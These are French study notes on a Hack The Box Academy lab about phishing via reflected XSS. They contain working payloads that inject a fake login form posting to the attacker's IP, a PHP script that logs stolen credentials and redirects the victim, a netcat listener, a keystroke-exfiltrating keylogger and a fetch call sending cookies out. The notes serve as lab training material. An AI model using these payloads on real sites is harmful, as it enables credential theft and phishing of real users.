---

titre: "XSS — Phishing & faux formulaires (vol de credentials)"

plateforme: "Hack The Box Academy"

module: "Cross-Site Scripting (XSS)"

date: 2026-06-30

tags: [HTB, XSS, WebSec, Phishing, ReflectedXSS, CredentialHarvesting, Notes]

---

  

# XSS — Phishing & faux formulaires (vol de credentials)

  

> Section 7 du module. Complète [[Cross-Site Scripting (XSS) — Fondamentaux, Stored & Reflected]].

> Pendant « credentials » du vol de cookies vu dans [[XSS — Exfiltration de cookies (Session Hijacking)]].

> Outillage (serveur, `tun0`, curl) : [[Outillage — WSL2, Exegol, VPN HTB & serveur d'exfiltration]].

  

---

  

## 1. Principe : XSS → phishing → vol d'identifiants

  

Là où le **session hijacking** vole le *cookie*, le **phishing XSS** vole directement les **identifiants** (login/mot de passe). On exploite une XSS pour **injecter un faux formulaire de connexion** dans une page légitime. La victime, en confiance sur un site qu'elle connaît, saisit ses identifiants → ils partent vers le serveur de l'attaquant.

  

Intérêt offensif majeur : la victime **fait confiance au domaine**. L'URL reste celle du vrai site (c'est une page légitime, juste détournée par l'injection), donc aucune alerte « domaine suspect ». C'est aussi un excellent support de **simulation de phishing** pour évaluer la sensibilisation des employés d'une organisation.

  

> Différence de nature avec le Blind XSS du cookie stealing : ici c'est une **Reflected XSS** (le payload transite dans un **paramètre d'URL** et est renvoyé immédiatement). L'attaque se matérialise par un **lien piégé** envoyé à la victime — il n'y a rien de stocké côté serveur.

  

---

  

## 2. Le lab : un visualiseur d'images (`/phishing`)

  

L'application est un **Online Image Viewer** : on fournit une URL d'image dans un paramètre `url`, et la page l'affiche :

  

```

http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg

```

  

Ce motif (afficher une ressource dont l'URL vient de l'utilisateur) est courant sur les forums et CMS — et c'est un point d'injection classique.

  

---

  

## 3. XSS Discovery — trouver le payload qui marche

  

Le payload de base échoue :

  

```

http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>

→ icône d'image cassée, rien ne s'exécute

```

  

**Pourquoi** : notre input atterrit dans un **attribut `src`** d'une balise `<img>` (`<img src="NOTRE_INPUT">`). Le `<script>` se retrouve coincé comme valeur d'attribut, inerte. C'est exactement le cas « contexte attribut » de la note Fondamentaux.

  

**Méthode** (rappel) : soumettre un repère, regarder la **source HTML**, voir où l'input atterrit, puis **fermer le contexte** avant d'injecter. Ici on casse l'attribut/la balise `<img>` :

  

```html

"><img src=x onerror=alert(window.origin)>

```

  

ou un breakout vers une nouvelle balise :

  

```html

"><script>alert(window.origin)</script>

```

  

Une fois qu'un payload exécute bien du JS, on a notre vecteur.

  

---

  

## 4. Injecter le faux formulaire avec `document.write()`

  

Au lieu d'un `alert()`, on **écrit du HTML** dans la page via `document.write()`. Le formulaire pointe son `action` vers **notre serveur** (notre IP `tun0`), pour y recevoir les identifiants.

  

HTML du formulaire (lisible) :

  

```html

<h3>Please login to continue</h3>

<form action=http://OUR_IP>

    <input type="username" name="username" placeholder="Username">

    <input type="password" name="password" placeholder="Password">

    <input type="submit" name="submit" value="Login">

</form>

```

  

Minifié sur une ligne dans `document.write()` (ce qui entre dans le payload XSS) :

  

```javascript

document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');

```

  

> `OUR_IP` = IP du tunnel VPN, obtenue avec `ip a` (interface `tun0`). Sur le setup Exegol, c'est la même IP `10.10.x.x` que pour le cookie stealer.

  

On injecte ce JS via le vecteur trouvé au §3, en remplaçant l'`alert(...)` par ce `document.write(...)`. La page affiche alors le formulaire de login… **mais** le champ URL d'origine est toujours visible, ce qui trahit le subterfuge.

  

---

  

## 5. « Cleaning Up » — rendre le piège crédible

  

### 5.1 Supprimer le formulaire d'origine

  

On identifie l'`id` de l'élément à retirer avec le **Picker** de l'inspecteur (`Ctrl+Shift+C`, puis clic sur l'élément). Ici le formulaire URL a l'id `urlform` :

  

```html

<form role="form" action="index.php" method="GET" id='urlform'>

```

  

On le supprime via :

  

```javascript

document.getElementById('urlform').remove();

```

  

Payload combiné (write + remove) :

  

```javascript

document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();

```

  

### 5.2 Commenter le HTML résiduel

  

Il reste souvent un bout de HTML original **après** notre injection. On le neutralise en ouvrant un **commentaire HTML** en fin de payload, qui « avale » le reste :

  

```html

...PAYLOAD... <!--

```

  

La page paraît alors **légitimement** demander une connexion. On copie l'URL finale (qui contient tout le payload encodé dans `?url=...`) et on l'envoie à la victime.

  

---

  

## 6. Credential Stealing — récupérer les identifiants

  

### 6.1 Première approche : netcat (voir la requête brute)

  

```bash

sudo nc -lvnp 80

```

  

Quand la victime soumet `test:test`, on capte la requête GET du formulaire :

  

```

GET /?username=test&password=test&submit=Login HTTP/1.1

Host: 10.10.XX.XX

```

  

Les identifiants sont **dans les paramètres de l'URL**. Limite : `nc` ne répond pas correctement en HTTP → la victime voit une erreur « Unable to connect » → ça éveille les soupçons.

  

### 6.2 Approche propre : serveur PHP qui logge + redirige

  

On remplace `nc` par un `index.php` qui **enregistre** les identifiants puis **redirige** la victime vers la vraie page (elle croit s'être connectée normalement) :

  

```php

<?php

if (isset($_GET['username']) && isset($_GET['password'])) {

    $file = fopen("creds.txt", "a+");

    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");

    header("Location: http://SERVER_IP/phishing/index.php");

    fclose($file);

    exit();

}

?>

```

  

Décortiqué :

  

| Élément | Rôle |

|---|---|

| `isset(username) && isset(password)` | n'agit que si les deux champs sont présents |

| `fopen(..., "a+")` | mode append → plusieurs victimes s'accumulent |

| `header("Location: ...")` | **redirige** la victime vers la vraie page → illusion d'un login réussi |

| `exit()` | stoppe le script après la redirection |

  

Démarrage du serveur :

  

```bash

mkdir /tmp/tmpserver && cd /tmp/tmpserver

vi index.php          # coller le script ci-dessus

sudo php -S 0.0.0.0:80

```

  

Récupération du butin :

  

```bash

cat creds.txt

# Username: test | Password: test

```

  

---

  

## 7. Adaptation à mon setup (Exegol / WSL2)

  

Le module suppose un **Pwnbox** (Parrot, root, port 80 libre). Sur mon environnement **Exegol/WSL2**, les ajustements vus dans [[Outillage — WSL2, Exegol, VPN HTB & serveur d'exfiltration]] s'appliquent :

  

| Module (Pwnbox) | Mon setup (Exegol) |

|---|---|

| `sudo php -S 0.0.0.0:80` | `php -S 0.0.0.0:8080` (port 80 occupé par l'image `web` ; **root** dans le conteneur → pas de `sudo`) |

| IP `tun0` via `ip a` | idem, mais **port à reporter** : `action=http://10.10.x.x:8080` dans le formulaire |

| navigateur Pwnbox | Firefox du conteneur (GUI X11) **ou** test direct via `curl` |

| envoi du lien à la « victime » | en lab, on visite soi-même l'URL piégée pour valider |

  

> ⚠️ Si on change le port en `8080`, le **`action=`** du formulaire ET le serveur PHP doivent porter ce port. Même piège que le `:8080` du cookie stealer.

  

Test de bout en bout possible avec `curl` (simuler la soumission de la victime) :

  

```bash

curl -s "http://OUR_IP:8080/?username=victime&password=hunter2&submit=Login"

cat creds.txt

```

  

---

  

## 8. Variantes utiles (repo de référence)

  

Repo standard : **PayloadsAllTheThings — section *XSS Injection*** (swisskyrepo), la référence que HTB cite lui-même.

🔗 `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection`

  

Au-delà du `document.write()` du module, le repo propose des techniques de phishing plus furtives :

  

**Réécrire toute la page via `innerHTML` + masquer l'URL.** PayloadsAllTheThings combine la falsification du formulaire avec un `history.replaceState()` pour modifier l'URL affichée sans recharger, ce qui renforce l'illusion (l'URL peut afficher `/login` au lieu du paramètre piégé) :

  

```javascript

history.replaceState(null, null, '../../../login');

document.body.innerHTML = "<h1>Please login to continue</h1><form>...</form>";

```

  

**Keylogger** (capter les frappes plutôt qu'attendre la soumission). Le repo documente un handler sur `onkeypress` qui exfiltre chaque touche via `fetch` + `String.fromCharCode` :

  

```javascript

<img src=x onerror='document.onkeypress=function(e){fetch("http://OUR_IP/?k="+String.fromCharCode(e.which))},this.remove();'>

```

  

**Exfiltration par `fetch` POST** (plus propre qu'un GET en clair dans l'URL) :

  

```javascript

fetch('http://OUR_IP', {method:'POST', mode:'no-cors', body:document.cookie});

```

  

> Note structurelle : sur les sinks `innerHTML`, les `<script>` injectés **ne se réexécutent pas** → privilégier `<img onerror>` / `<svg onload>` (cf. [[XSS — Bypass & Filter Evasion (WAF, Sanitizers)]]).

  

---

  

## 9. Pièges & diagnostics

  

| Symptôme | Cause | Correctif |

|---|---|---|

| Image cassée, pas d'exécution | input dans attribut `src` → `<script>` inerte | breakout `">` + `<img onerror>` |

| Formulaire injecté mais champ URL visible | formulaire d'origine pas retiré | `document.getElementById('urlform').remove()` |

| HTML résiduel après le faux formulaire | reste du template original | terminer le payload par `<!--` |

| « This site can't be reached » à la soumission | aucun listener sur `OUR_IP` | démarrer le serveur (PHP/nc) avant de tester |

| Victime voit une erreur après login | `nc` ne répond pas en HTTP | serveur PHP avec `header("Location: ...")` |

| Rien dans `creds.txt` | mauvais port / IP dans `action=` | reporter `:8080` et l'IP `tun0` à jour |

  

---

  

## 10. À retenir

  

- Phishing XSS = injecter un **faux formulaire** dont l'`action` pointe vers son serveur → vol de **credentials** (vs cookie pour le hijacking).

- Vecteur ici = **Reflected XSS** via paramètre `url` → attaque par **lien piégé**.

- Chaîne : `document.write()` (injecter le form) → `getElementById().remove()` (cacher l'original) → `<!--` (nettoyer le reste).

- Serveur **PHP qui logge + redirige** > `nc` brut : la redirection évite l'erreur qui éveille les soupçons.

- Sur Exegol : port **8080**, pas de `sudo`, IP `tun0` à jour, port reporté dans `action=`.

- Pour aller plus loin : `innerHTML` + `history.replaceState()`, keylogger, `fetch` POST (PayloadsAllTheThings).

  

---

  

## Liens

  

- [[Cross-Site Scripting (XSS) — Fondamentaux, Stored & Reflected]]

- [[XSS — Exfiltration de cookies (Session Hijacking)]]

- [[XSS — Bypass & Filter Evasion (WAF, Sanitizers)]]

- [[Outillage — WSL2, Exegol, VPN HTB & serveur d'exfiltration]]

- [[XSS — Defacement & prévention]]